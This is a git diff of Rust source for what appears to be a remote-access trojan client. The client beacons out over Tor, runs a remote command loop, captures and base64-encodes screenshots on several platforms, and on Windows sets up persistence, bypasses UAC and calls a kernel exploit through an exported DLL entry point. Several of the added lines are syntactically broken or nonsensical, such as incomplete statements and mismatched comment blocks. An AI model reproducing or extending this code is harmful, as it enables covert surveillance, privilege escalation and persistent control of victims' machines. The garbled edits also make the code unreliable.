@@ -11,6 +11,8 @@ use is_elevated::is_elevated;
 
 
 use arti_client::{TorClient, TorClientConfig, DataStream};
+#[cfg(target_os = "windows")]
+use libc::malloc;
 use tor_rtcompat::PreferredRuntime;
 use tokio::io::split;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
@@ -18,25 +20,29 @@ use tokio::process::Command;
 use anyhow::{Result, anyhow};
 use gethostname::gethostname;
 use tokio::time::{sleep, Duration};
-use rand::{thread_rng};
+#[cfg(target_os = "windows")]
+use zstd::zstd_safe::OutBuffer;
+#[cfg(target_os = "linux")]
+use core::ffi::c_str::Bytes;
+use core::task;
 use std::{fs};
 use std::path::{Path};
 use base64::{engine::general_purpose, Engine as _};
 use libc::{c_int};
 
 #[cfg(target_os = "windows")]
-use screenshots::Screen;
+use screenshots::{*};
 #[cfg(target_os = "macos")]
-use screenshots::Screen;
+use screenshots::{*};
 #[cfg(target_os = "linux")]
-use screenshots::Screen;
+use screenshots::{*};
 
 #[cfg(target_os = "windows")]
-use image::ImageOutputFormat;
+use image::{*};
 #[cfg(target_os = "macos")]
-use image::ImageOutputFormat;
+use image::{*};
 #[cfg(target_os = "linux")]
-use image::ImageOutputFormat;
+use image::{*};
 
 
 
@@ -77,39 +83,40 @@ async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
     println!("Initialized Tor Client");
     Ok(client)
 }
-#[cfg(target_os = "linux")]
+/*/#[cfg(target_os = "linux")]
 fn take_screenshot_base64() -> anyhow::Result<String> {
     let screens = Screen::all()?;
     let screen = &screens[0];
-
+    Pixels::map_windows( f)
     let image_buffer = screen.capture()?;
-    let mut buf = Vec::new();
-    image_buffer.write_to(&buf, ImageOutputFormat::Png)?;
-    let encoded = general_purpose::STANDARD.encode(&buf); 
+    let mut buf = (image_buffer)
+    image_buffer.write_to(&buf, Png)?;
+    let encoded = general_purpose::STANDARD.encode(buf); 
     Ok(format!("{}",encoded))
 }
 #[cfg(target_os = "windows")]
 fn take_screenshot_base64() -> anyhow::Result<String> {
     let screens = Screen::all()?;
     let screen = &screens[0];
-
     let image_buffer = screen.capture()?;
-    let mut buf = Vec::new();
-    image_buffer.write_to(&buf, ImageOutputFormat::Png)?;
-    let encoded = general_purpose::STANDARD.encode(&buf); 
+    let mut buf = ImageBuffer::new(3000,3000);
+    image_buffer.
+    let encoded = general_purpose::STANDARD.encode(concat_bytes!(&buf.to_vec())); 
     Ok(format!("{}",encoded))
 }
 #[cfg(target_os = "macos")]
 fn take_screenshot_base64() -> anyhow::Result<String> {
     let screens = Screen::all()?;
     let screen = &screens[0];
-
     let image_buffer = screen.capture()?;
-    let mut buf = Vec::new();
-    image_buffer.write_to(&buf, ImageOutputFormat::Png)?;
-    let encoded = general_purpose::STANDARD.encode(&buf); 
+    let mut buf = ImageBuffer::new(3000,3000);
+    image_buffer.write_to(&buf, Png)?;
+    let encoded = general_purpose::STANDARD.encode(buf); 
     Ok(format!("{}",encoded))
 }
+**/
+
+// different implementation on android
 #[cfg(target_os = "android")]
 fn take_screenshot_base64()-> anyhow::Result<String>{
     let path_str = "/data/local/tmp/screenshot.png";
@@ -123,7 +130,11 @@ fn take_screenshot_base64()-> anyhow::Result<String>{
     let encoded = general_purpose::STANDARD.encode(buf);
     Ok(format!("{}",encoded))
 }
-
+/*
+fn take_screenshot_base64() -> anyhow::Result<String>{
+    let msg = String::" "
+    Ok(msg)
+}*/
 
 /// Build prompt string
 pub fn build_prompt() -> String {
@@ -228,7 +239,6 @@ Available commands:
                 }
             }
         }
-
         "uac" => {
             #[cfg(target_os = "windows")]
             {
@@ -361,13 +371,16 @@ pub async fn netclient_run(config: ClientConfig) -> Result<()> {
                 println!("Connection failed: {}", e);
             }
         }
-        let mut rng = thread_rng();
-        let delay = rng.gen_range(19..=67);
+        //let mut rng = thread_rng();
+        let delay = 17;
         println!("Reconnecting in {} seconds...", delay);
         sleep(Duration::from_secs(delay)).await;
     }
 }
+
+#[cfg(target_os = "windows")]
 const IS_DLL:bool = true;
+
 #[unsafe(export_name = "netclient")]
 pub async extern "C" fn netclient()->  c_int {
     #[cfg(target_os = "windows")]
@@ -385,10 +398,10 @@ pub async extern "C" fn netclient()->  c_int {
             kernel_exploit::exploit();
         }
         uac_bypass::elevate_uac(&exe_str);
-        return Ok(());
+        return 1;
     } 
     #[cfg(target_os = "windows")]
-    persist::persist(IS_DLL)?;
+    persist::persist(IS_DLL);
     #[cfg(target_os = "windows")]
     if !is_elevated(){
         sleep(Duration::from_secs(61)).await;
